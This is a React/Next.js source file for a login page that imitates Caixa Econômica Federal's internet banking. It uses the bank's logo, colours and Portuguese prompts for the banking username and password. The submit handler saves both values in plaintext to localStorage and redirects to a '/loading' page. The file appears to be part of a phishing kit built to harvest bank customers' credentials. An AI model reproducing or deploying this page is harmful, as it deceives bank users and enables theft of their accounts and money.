import React, { useEffect, useState } from 'react';
import { RiUserFill, RiLockPasswordFill } from 'react-icons/ri';
import { useRouter } from 'next/router';

const IndexPage = () => {
  const [currentImage, setCurrentImage] = useState(0);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [formError, setFormError] = useState(false);

  const images = [
    'fundo.png',
    'fundo1.png',
    'fundo02.png',
    'fundo03.png',
    'fundo04.png'
  ];

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentImage((prevImage) => (prevImage + 1) % images.length);
    }, 3500);

    return () => {
      clearInterval(interval);
    };
  }, [images]);

  const backgroundImageStyle = {
    backgroundImage: `url(${images[currentImage]})`,
    backgroundSize: 'cover',
    backgroundRepeat: 'no-repeat',
    backgroundPosition: 'center',
  };

  const router = useRouter();

  const handleFormSubmit = (event) => {
    event.preventDefault();

    // Verifica se os campos estão preenchidos
    if (username.trim() === '' || password.trim() === '') {
      setFormError(true);
      return;
    }

    // Armazena as informações no localStorage
    localStorage.setItem('username', username);
    localStorage.setItem('password', password);

    // Redireciona para a página "loading.js"
    router.push('/loading');
  };

  return (
    <div className="flex flex-col items-center justify-center h-screen" style={backgroundImageStyle}>
      <div className="flex flex-col items-center justify-center h-screen">
        <div className="max-w-md w-full px-9 py-8 bg-white rounded-md shadow-md mt-auto mb-0" style={{ marginBottom: '30%' }}>
          <div className="flex justify-center mb-2">
            <img src="logo-caixa-economica-federal-256.png" alt="Logo" className="w-19 h-19" />
          </div>
          <h1 className="text-center text-lg sz-1 font-bold mb-4 text-gray-800" style={{ color: '#005ca9' }}>
            Login Caixa
          </h1>
          <form onSubmit={handleFormSubmit}>
            <div className="mb-4 relative">
              <label htmlFor="username" className="text-gray-800 font-medium mb-1">
                Usuário do Internet Banking
              </label>
              <div className="relative">
                <input
                  type="text"
                  id="username"
                  className="w-full bg-customColor rounded-md pl-10 pr-3 py-2 focus:outline-none focus:border-blue-400 focus:shadow-outline-blue text-gray-800"
                  placeholder="Digite seu usuário"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                />
                <span className="absolute left-3 top-1/2 transform -translate-y-1/2">
                  <RiUserFill className="text-gray-600" color="#f8a23d" />
                </span>
              </div>
            </div>
            <div className="mb-4 relative">
              <label htmlFor="password" className="text-gray-800 font-medium mb-1">
                Senha
              </label>
              <div className="relative">
                <input
                  type="password"
                  id="password"
                  pattern="^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$"
                  className="w-full bg-customColor rounded-md pl-10 pr-3 py-2 focus:outline-none focus:border-blue-400 focus:shadow-outline-blue text-gray-800"
                  placeholder="Digite sua senha"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
                <span className="absolute left-3 top-1/2 transform -translate-y-1/2">
                  <RiLockPasswordFill className="text-gray-600" color="#f8a23d" />
                </span>
              </div>
            </div>
            {formError && (
              <p className="text-red-500 text-sm mb-2">Por favor, preencha todos os campos.</p>
            )}
            <button
              type="submit"
              className="w-full hover:bg-red text-white font-medium py-3 rounded-md focus:outline-none"
              style={{ backgroundColor: '#005ca9' }}
            >
              Entrar
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default IndexPage;
